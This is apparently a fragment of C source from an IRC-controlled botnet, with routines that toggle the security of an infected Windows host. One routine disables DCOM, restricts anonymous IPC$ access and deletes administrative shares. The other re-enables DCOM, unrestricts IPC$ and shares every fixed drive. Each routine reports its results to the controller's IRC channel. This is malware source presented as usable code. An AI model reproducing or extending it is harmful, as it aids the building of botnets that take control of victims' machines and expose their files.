	...
	if (!noadvapi32) {
		...
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			...
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"secure »» Disable DCOM failed.");
			else
				sprintf(sendbuf,"secure »» DCOM disabled.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"secure »» Failed to open DCOM registry key.");
		...
		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			...
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"secure »» Failed to restrict access to the IPC$ Share.");
			else
				sprintf(sendbuf,"secure »» Restricted access to the IPC$ Share.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"secure »» Failed to open IPC$ Restriction registry key.");
	} else
		sprintf(sendbuf,"secure »» Advapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);
			...
			if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
				...
				for(unsigned int i=1;i <= entriesread;i++) {
					if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$') {
						if(ShareDel(NULL,AsAnsiString(p->shi502_netname)) == NERR_Success)
							_snprintf(sendbuf,sizeof(sendbuf),"secure »» Share '%S' deleted.",p->shi502_netname);
						else
							_snprintf(sendbuf,sizeof(sendbuf),"secure »» Failed to delete '%S' share.",p->shi502_netname);
						if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
						addlog(sendbuf);
					}
				...
				for(int i=0;i < (sizeof(ShareList) / sizeof (NetShares));i++) {
					if(ShareDel(NULL,ShareList[i].ShareName) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"secure »» Share '%s' deleted.",ShareList[i].ShareName);
					else
						_snprintf(sendbuf,sizeof(sendbuf),"secure »» Failed to delete '%s' share.",ShareList[i].ShareName);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				}
			}
		} while (nStatus == ERROR_MORE_DATA);
		sprintf(sendbuf,"secure »» Network shares deleted.");
	} else
		sprintf(sendbuf,"secure »» Netapi32.dll couldn't be loaded.");
...
BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	...
	if (!noadvapi32) {
		...
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			TCHAR szDataBuf[]="Y";
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"secure »» Enable DCOM failed.");
			else
				sprintf(sendbuf,"secure »» DCOM enabled.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"secure »» Failed to open DCOM registry key.");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		...
		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			...
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"secure »» Failed to unrestrict access to the IPC$ Share.");
			else
				sprintf(sendbuf,"secure »» Unrestricted access to the IPC$ Share.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"secure »» Failed to open IPC$ restriction registry key.");
	} else
	...
	if (!nonetapi32) {
		for(int i=0;i < ((sizeof(ShareList) / sizeof (NetShares)) - 2);i++) {
			if(ShareAdd(NULL,ShareList[i].ShareName,ShareList[i].SharePath) == NERR_Success)
				_snprintf(sendbuf,sizeof(sendbuf),"secure »» Share '%s' added.",ShareList[i].ShareName);
			else
				_snprintf(sendbuf,sizeof(sendbuf),"secure »» Failed to add '%s' share.",ShareList[i].ShareName);
			if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
			addlog(sendbuf);
		}
			...
			if((dwDrives & 1)==1 && cDrive != 'A') {
				...
				if (fGetDriveType(sharepath) == DRIVE_FIXED) {
					if(ShareAdd(NULL,sharename,sharepath) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"secure »» Share '%s' added.",sharename);
					else
						_snprintf(sendbuf,sizeof(sendbuf),"secure »» Failed to add '%s' share.",sharename);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				}
			}
		...
		sprintf(sendbuf,"secure »» Network shares added.");
	} else
		sprintf(sendbuf,"secure »» Netapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);
